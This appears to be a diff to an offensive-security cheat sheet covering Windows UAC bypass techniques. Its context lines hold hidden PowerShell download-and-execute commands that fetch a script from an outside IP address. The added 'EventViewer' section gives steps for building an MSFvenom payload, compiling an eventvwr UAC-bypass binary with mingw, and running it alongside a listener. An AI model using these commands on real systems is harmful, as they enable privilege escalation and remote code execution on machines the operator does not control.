@@ -430,8 +430,23 @@ runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-obj
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 ```
 
+## EventViewer
+```
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+Generate MSFvenom .exe payload: run.exe
 
+Change binary in evenvwrbypass.c to payload
+strcat(curPath, "\run.exe");
 
+Compile to .exe: 64 ot 32 bit
+x86_64-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-64.exe
+i686-w64-mingw32-gcc eventvwrbypass.c -o eventvwr-bypassuac-32.exe
+# -static flag for library issues
+
+Run Executable with listener setup in same directory as MSFvenom payload
+eventvwr-bypassuac-64.exe
+eventvwr-bypassuac-32.exe
+```
 
 
 
